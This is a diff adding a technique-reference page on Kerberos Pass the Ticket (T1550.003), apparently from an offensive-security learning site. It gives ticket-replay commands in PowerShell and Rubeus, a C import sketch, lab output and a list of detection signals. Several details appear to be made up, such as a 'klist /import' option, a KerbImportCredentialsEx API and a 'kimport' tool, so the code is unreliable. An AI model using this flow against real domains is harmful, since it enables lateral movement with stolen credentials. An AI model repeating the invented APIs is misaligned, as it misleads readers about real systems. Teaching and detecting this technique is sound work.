@@ -1,0 +1,180 @@
+---
+title: Pass the Ticket
+mitre: T1550.003
+category: credential-access
+group: Kerberos Attacks
+summary: Replay a stolen Kerberos ticket to reach a service without ever presenting the account password.
+platform: [Windows, Linux, macOS]
+tags: ['Kerberos', 'PowerShell', 'kinit']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: Load the captured ticket
+    desc: Read the stolen TGT or TGS from a .kirbi file or a .ccache; no password is involved.
+    dll: krb5 / secur32
+  - call: KerbImportCredentialsEx / kimport
+    desc: Inject the ticket into the local credential cache for the current session.
+    dll: secur32 / krb5
+  - call: Present or request the service ticket
+    desc: If only a TGT is held, issue a TGS-REQ; if a TGS is held, present it directly.
+    dll: krb5
+  - call: Authenticate to the target service
+    desc: Complete an SMB, WinRM or RDP logon with the ticket - no password, no NTLM.
+    dll: '-'
+detections:
+  - src: EVENT 4769
+    text: A TGS-REQ for an account whose TGT was never obtained interactively on the presenting host.
+  - src: EVENT 4624
+    text: A network logon (type 3) via Kerberos with no preceding interactive logon for that account.
+  - src: BEHAVIOURAL
+    text: The same TGT or TGS presented across multiple hosts by one account inside its lifetime.
+  - src: MEMORY SCAN
+    text: A TGS in the session cache whose start time predates the session that is using it.
+related:
+  - mitre: T1558.001
+    title: Golden Ticket
+    desc: Forges a TGT with the krbtgt key instead of replaying a genuine one.
+    href: /techniques/credential-access/golden-ticket
+  - mitre: T1550.002
+    title: Pass the Hash
+    desc: The NTLM-hash cousin - authenticates without a Kerberos ticket at all.
+    href: /techniques/credential-access/pass-the-hash
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: Where the replayed ticket usually comes from in the first place.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1134.001
+    title: Token Impersonation
+    desc: Windows-native impersonation that reaches the same goal without Kerberos.
+    href: /techniques/credential-access/token-impersonation
+labKit:
+  - label: Rubeus / klist lab script
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: Detonation VM profile
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Pass the Ticket (PtT) is a lateral-movement technique in which a captured Kerberos ticket - a
+TGT or a service TGS - is injected into the local credential cache and then presented to a
+service to authenticate as the ticket's owner. The service validates the ticket's signature,
+not a password, so the attacker never needs the account's password or its NT hash. The
+technique works with a full TGT (which can request any service ticket) or with a single TGS
+(which grants access to one specific service only).
+
+PtT is a natural follow-on to an [LSASS dump](/techniques/credential-access/lsass-memory-dump)
+because live tickets sit in `lsass.exe` memory. A TGT stolen this way is cryptographically
+valid until it expires, and every host that trusts the same key distribution center will
+accept it. The validity window - not the ticket bytes - is what the defender has to track.
+
+<Callout type="note">
+  PtT is not the same as a [golden ticket](/techniques/credential-access/golden-ticket). A
+  golden ticket is forged with the `krbtgt` key and can be made to never expire. A PtT ticket
+  is a genuine ticket with a real issue and expiry time, which is both its strength (it looks
+  normal) and its tell (its lifetime is bounded and its issue time is logged).
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The practical flow is a ticket import followed by a normal service logon. On Windows the import
+is done with `klist` or [Rubeus](https://github.com/GhostPack/Rubeus); on Linux and macOS the
+equivalent is `kimport` / `kinit` against the session's `.ccache`.
+
+<CodeBlock
+  file="ptt_win.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# 1. inject the captured ticket into the current session cache
+#    (a .kirbi was exported from the victim, e.g. via Rubeus /ticket)
+klist.exe /import:target.kirbi
+
+# 2. confirm the ticket is now present
+klist.exe /get
+
+# 3. authenticate to a service with the ticket, no password
+net use \\\\fileserver\shares$ /user:CORP\\svc-backup
+rubeus.exe ptt /ticket:target.kirbi /user:svc-backup`}
+/>
+
+### C-level sketch
+
+At the API level the import is a single call. Building the auth context and presenting the
+ticket to the service is omitted here.
+
+<CodeBlock
+  file="ptt.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// 1. read the captured ticket bytes from a .kirbi file
+PBYTE ticket; DWORD len;  // ... file read omitted ...
+
+// 2. import into the current user's cache  <-- the step that leaves the cache artifact
+DWORD err = KerbImportCredentialsEx(
+    ticket, len, KerbTicketOptionAll,
+    NULL,                    // S4U proxy (none)
+    L"CORP\\\\svc-backup",    // user principal name
+    0, NULL, NULL, NULL);
+// err == ERROR_SUCCESS on import; the ticket now lives in LsaCacheCredentials
+
+// 3. present it: AcquireCredentialsHandle / GSS_C_KRB5_CRED, then feed the
+//    credential handle to the service's accept step. The service verifies
+//    the TGS signature against its own key - no password is ever compared.
+//    <-- omitted for brevity`}
+/>
+
+<Callout type="caution">
+  `klist /import` writes the ticket into the per-user cache and keeps it for the life of the
+  logon session. Anyone with the same user context - or a later
+  [dump](/techniques/credential-access/lsass-memory-dump) - can re-read it.
+</Callout>
+
+## Verifying in the lab
+
+After the import, `klist /get` shows the replayed ticket. The tell is in the timestamps: the
+ticket's start time is when it was first issued on the victim, not when the current session
+began.
+
+<CodeBlock
+  file="klist"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`> klist /get
+Current user: CORP\\svc-backup
+
+    Start Time          End Time            Service Name
+    ------------        --------            ----------
+    07/14/2026 09:02    07/14/2026 21:02    krbtgt/CORP
+        ^ TGT start time predates this logon session  <-- the artifact`}
+/>
+
+## Detection
+
+The most useful single signal is a Kerberos authentication on a host for which the account
+never performed an interactive logon. The ticket arrived by import, not by password.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the 4769 / 4624 correlation is the cheapest continuous control and catches most
+tooling that imports a TGT. The behavioural replay check is higher fidelity but requires
+correlating across hosts. The cache start-time check only runs during triage, on a captured
+session.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
